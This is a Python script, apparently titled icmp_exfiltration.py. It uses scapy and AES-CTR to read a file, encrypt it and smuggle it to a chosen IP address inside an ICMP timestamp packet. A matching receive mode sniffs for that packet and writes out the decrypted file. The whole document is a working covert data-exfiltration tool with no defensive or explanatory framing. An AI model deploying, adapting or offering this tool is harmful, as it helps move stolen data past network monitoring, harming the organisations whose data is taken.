from scapy.all import *
from sys import argv
from Crypto.Cipher import AES


def encrypt_aes_ctr(key, plaintext):
    # Create a new AES cipher object in CTR mode
    cipher = AES.new(key, AES.MODE_CTR)
    # Encrypt the plaintext
    ciphertext = cipher.encrypt(plaintext)
    return cipher.nonce + ciphertext

def decrypt_aes_ctr(key, ciphertext):
    # Extract the nonce and ciphertext from the ciphertext
    nonce = ciphertext[:8]
    ciphertext = ciphertext[8:]
    # Create a new AES cipher object in CTR mode
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    # Decrypt the ciphertext
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

def send_icmp_packet(data, ip_dst):
    # Create an ICMP packet with the given data that does not echo
    packet = IP(dst=ip_dst) / ICMP(type=13) / Raw(load=data)
    # Send the packet
    send(packet, verbose=0)

def receive_icmp_packet():
    pkt = sniff(filter="icmp and icmp[icmptype] == 13", count=1)[0]
    return pkt

def main():
    if len(argv) != 4:
        if len(argv) != 5:
            print(f"You provided {len(argv) - 1} arguments, but 4 or 5 are required.")
            print("Usage: python icmp_exfiltration.py <send> <key> <datapath> <ip_dst>")
            print("Usage: python icmp_exfiltration.py <receive> <key> <datapath>")
            return
    
    mode = argv[1]
    key = bytes.fromhex(argv[2])
    datapath = argv[3]
    if mode == "send":
        ip_dst = argv[4]
    elif mode == "receive":
        ip_dst = None
    else:
        print("Invalid mode. Use 'send' or 'receive'.")
        return

    if mode == "send":
        # Read the data from the file
        with open(datapath, "rb") as f:
            data = f.read()
        
        # Encrypt the data using AES CTR mode
        ciphertext = encrypt_aes_ctr(key, data)
        
        # Send the encrypted data in ICMP packets
        send_icmp_packet(ciphertext, ip_dst)
    elif mode == "receive":
        # Receive the ICMP packet
        packet = receive_icmp_packet()
        
        # Extract the encrypted data from the packet
        ciphertext = bytes(packet[ICMP].load)
        
        # Decrypt the data using AES CTR mode
        plaintext = decrypt_aes_ctr(key, ciphertext)
        
        # Write the decrypted data to the file
        with open(datapath, "wb") as f:
            f.write(plaintext)
    else:
        print("Invalid mode. Use 'send' or 'receive'.")
        return

if __name__ == "__main__":
    main()
